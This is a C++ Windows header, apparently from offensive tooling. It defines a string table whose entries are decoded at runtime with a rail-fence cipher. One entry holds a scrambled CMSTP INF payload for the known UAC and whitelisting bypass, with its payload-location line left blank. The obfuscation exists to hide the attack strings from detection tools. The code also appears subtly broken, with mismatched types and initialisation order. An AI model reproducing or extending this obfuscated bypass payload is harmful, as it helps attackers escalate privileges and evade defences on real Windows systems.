#pragma once
#include <Windows.h>
#include <map>
#include <any>
#include <vector>

#include "Cipher.hpp"
#include "config.h"

#define ST_CMSTP_PAYLOAD 0x2
#define ST_NAMESPACE_CIMV2 0x4


static class StringTable
{
public:

	StringTable() = default;
	~StringTable() = default;

	// Generalized template
	template <typename T>
	const BOOL GetString(
		_In_ int& key,
		_Out_ T& string)
	{
		ILog("Invalid type specification for GetString\n");
		return FALSE;
	}

	// Specialized template (vector of std::wstring)
	template <>
	const BOOL GetString(
		_In_ int& key,
		_Out_ std::vector<std::wstring>& vector)
	{
		// Iterate over map
		for (auto& [k, v] : m_StringTable)
		{
			// If key matches
			if (k == key)
			{
				try
				{
					// Iterate over vector
					for (auto& wstring : std::any_cast<std::vector<std::wstring>>(v))
					{
						// Decipher
						std::wstring decrypted;
						ciph.decipher(5, wstring, decrypted);

						// Add to vector
						vector.push_back(decrypted);
					}
				}
				catch (const std::bad_any_cast& e)
				{
					ILog("Bad any cast: %s\n", e.what());
					return FALSE;
				}

				return TRUE;
			}
		}
		return FALSE;
	}

	// Specialized template (std::wstring)
	template <>
	const BOOL GetString(
		_In_ int& key,
		_Out_ std::wstring& wstring)
	{
		// Iterate over map
		for (auto& [k, v] : m_StringTable)
		{
			// If key matches
			if (k == key)
			{
				// Decipher
				std::wstring decrypted;

				try
				{
					ciph.decipher(5, std::any_cast<std::wstring>(v), decrypted);
				}
				catch (const std::bad_any_cast& e)
				{
					ILog("Bad any cast: %s\n", e.what());
					return FALSE;
				}

				// Set wstring
				wstring = decrypted;

				// Return
				return TRUE;
			}
		}
		return FALSE;
	}

	// Specialized template (std::string/UTF8)
	template <>
	const BOOL GetString(
		_In_ int& key,
		_Out_ std::string& string)
	{
		// Iterate over map
		for (auto& [k, v] : m_StringTable)
		{
			// If key matches
			if (k == key)
			{
				// Decipher
				std::wstring decrypted;
				
				try
				{
					ciph.decipher(5, std::any_cast<std::wstring>(v), decrypted);
				}
				catch (const std::bad_any_cast& e)
				{
					ILog("Bad any cast: %s\n", e.what());
					return FALSE;
				}
				
				// Convert to std::string
				std::string utf8decrypted = EncodeUTF8(decrypted);

				// Return
				string = utf8decrypted;
				
				return TRUE;
			}
		}
		return FALSE;
	}
	
	
private:
	
	std::string EncodeUTF8(const std::wstring& wstr)
	{
		if (wstr.empty()) return std::string();
		int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
		std::string strTo(size_needed, 0);
		WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
		return strTo;
	}
	
	const std::map<DWORD, std::any> m_StringTable =
	{
		{ 0x1, L"OK" },
		{ 0x2, CMSTP_Payload },
	};

	LPCSTR CMSTP_Payload[16] = {
			"[]vneoris",
			"Segir=aogu$c$ntciah",
			"AIddNveF5ac=.n2",
			"[IDtn]elslfutlaa",
			"CsnscUueto=ntetlssDiiCIDSiletmntutetoAroassns",
			"RtnroeueuadPeCmScnSpmsnSpmstPeCm=ueuadinroRtno",
			"[eaiRStmntoueumdcnnrpose]PCS",
			"", // payload location
			"t tFal/sp/slIm. kiMceek x",
			"[ttsCsDciUeuneeolrsIsSnlsttA]",
			"40SS 990UeDe,7041lrIcn0,=l_Dto0ALi",
			"[_tArLcileDeolSISnUD]",
			"\"\"EooeoaG\"il eoH SR\\sfdwrninPtMRE,flal,\"pcrr\"K,OAMotnsrts\\ hM3X oetP\"%xtr%\"L\"FWir\\i\\uVrApsC2E\"rIsahUeeE\" MTcWCep\\.Pntnd,",
			"[]Sstgrni",
			"SayteNmr  hreeeltivc=Vein\"i\"gg",
			"SNr hcaeyttovmV ih\"rSe\"lgigt=en"
	};
	static Railfence ciph;
};